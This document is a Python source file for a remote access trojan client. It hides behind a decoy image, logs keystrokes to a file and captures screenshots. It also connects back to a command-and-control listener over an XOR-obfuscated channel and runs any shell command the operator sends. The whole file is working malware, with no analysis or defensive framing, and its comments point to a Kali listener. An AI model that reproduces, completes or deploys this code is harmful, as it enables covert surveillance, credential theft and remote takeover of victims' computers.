import socket
import json
import os
import sys
import time
import threading
import hashlib
import base64
import subprocess
from pynput.keyboard import Listener
import mss  # Cross-platform screenshot capture library

# --- Connection Settings ---
SERVER_HOST = "127.0.0.1"  # Replace with your Kali Linux listener IP address
SERVER_PORT = 8080

# Pre-shared 8-bit XOR key for payload obfuscation (must match server)
KEY = b'simple_xor_key'

# Lock mechanism for thread-safe log file access
log_lock = threading.Lock()

# Set current working directory to the script's directory
try:
    script_dir = os.path.dirname(os.path.abspath(__file__))
    if script_dir:
        os.chdir(script_dir)
except Exception:
    pass


def xor_crypt(data: bytes) -> bytes:
    """Applies symmetric XOR encryption/decryption using a static repeating key."""
    return bytes(b ^ KEY[i % len(KEY)] for i, b in enumerate(data))


def send_msg(sock: socket.socket, obj: dict):
    """Encodes JSON payload, encrypts with XOR, and prepends a 4-byte big-endian length header."""
    try:
        raw = json.dumps(obj).encode('utf-8')
        enc = xor_crypt(raw)
        length = len(enc).to_bytes(4, 'big')
        sock.sendall(length + enc)
    except Exception:
        pass


def recv_msg(sock: socket.socket) -> dict:
    """Reads the 4-byte length header prefix, receives full frame payload, and decrypts JSON."""
    length_bytes = sock.recv(4)
    if not length_bytes:
        raise ConnectionError("C2 connection terminated.")
    length = int.from_bytes(length_bytes, 'big')
    data = b''
    while len(data) < length:
        chunk = sock.recv(length - len(data))
        if not chunk:
            raise ConnectionError("Stream interrupted while receiving payload.")
        data += chunk
    dec = xor_crypt(data)
    return json.loads(dec.decode('utf-8', errors='replace'))


def handle_screencap(sock: socket.socket):
    """Captures desktop screen across platforms (Windows/Linux) using mss and returns Base64 PNG."""
    try:
        with mss.mss() as sct:
            # Capture the primary monitor
            monitor = sct.monitors[1] if len(sct.monitors) > 1 else sct.monitors[0]
            sct_img = sct.grab(monitor)
            png_bytes = mss.tools.to_png(sct_img.rgb, sct_img.size)
            img_str = base64.b64encode(png_bytes).decode('utf-8')
            send_msg(sock, {"result": "[+] Screenshot captured successfully!", "data": img_str})
    except Exception as e:
        send_msg(sock, {"result": f"[-] Screenshot failed: {str(e)}"})


def handle_hash(sock: socket.socket, filename: str):
    """Computes SHA-256 hash checksum for requested local file in a thread-safe manner."""
    try:
        target = filename if filename else "logs.txt"
        if not os.path.exists(target):
            send_msg(sock, {"result": f"[-] Error: {target} not found."})
            return

        h = hashlib.sha256()
        with log_lock:
            with open(target, "rb") as f:
                for chunk in iter(lambda: f.read(4096), b""):
                    h.update(chunk)
        send_msg(sock, {"result": f"[+] SHA256 ({target}): {h.hexdigest()}"})
    except Exception as e:
        send_msg(sock, {"result": f"[-] Hash calculation error: {str(e)}"})


def start_keylogger():
    """Asynchronous keylogger recording keystrokes to logs.txt in thread-safe mode."""
    def on_press(key):
        with log_lock:
            with open("logs.txt", "a", encoding="utf-8") as f:
                f.write(f"{key} ")

    try:
        with Listener(on_press=on_press) as listener:
            listener.join()
    except Exception:
        pass


def execute_command(cmd: str) -> str:
    """Executes arbitrary OS shell command and returns formatted standard output or error."""
    try:
        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
        return output.decode('utf-8', errors='replace')
    except subprocess.CalledProcessError as e:
        return e.output.decode('utf-8', errors='replace')
    except Exception as e:
        return str(e)


def connect_c2():
    """Main client loop featuring exponential reconnection strategy and payload handler."""
    # Optional decoy launch on execution
    if os.path.exists("image.jpg"):
        try:
            if sys.platform.startswith('win'):
                os.startfile("image.jpg")
            elif sys.platform.startswith('linux'):
                subprocess.Popen(["xdg-open", "image.jpg"])
        except Exception:
            pass

    # Start background keylogger listener thread
    threading.Thread(target=start_keylogger, daemon=True).start()

    # Connection retry parameters
    retry_delay = 5

    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((SERVER_HOST, SERVER_PORT))
            retry_delay = 5  # Reset delay upon successful connection

            while True:
                msg = recv_msg(sock)
                if not msg:
                    break

                action = msg.get("action", "")
                if action == "screencap":
                    handle_screencap(sock)
                elif action == "keylog":
                    with log_lock:
                        if os.path.exists("logs.txt"):
                            with open("logs.txt", "r", encoding="utf-8", errors="replace") as f:
                                logs = f.read()
                            send_msg(sock, {"result": f"\n[Logs]:\n{logs}"})
                        else:
                            send_msg(sock, {"result": "[-] No log file found."})
                elif action == "hash":
                    handle_hash(sock, msg.get("filename", "logs.txt"))
                elif action == "terminate":
                    send_msg(sock, {"result": "[+] Terminating payload process gracefully."})
                    sock.close()
                    sys.exit(0)
                elif action:
                    out = execute_command(action)
                    send_msg(sock, {"result": out})

        except Exception:
            # Connection failed or lost; wait before retrying
            time.sleep(retry_delay)
            retry_delay = min(retry_delay * 2, 60)
        finally:
            try:
                sock.close()
            except Exception:
                pass


if __name__ == "__main__":
    connect_c2()
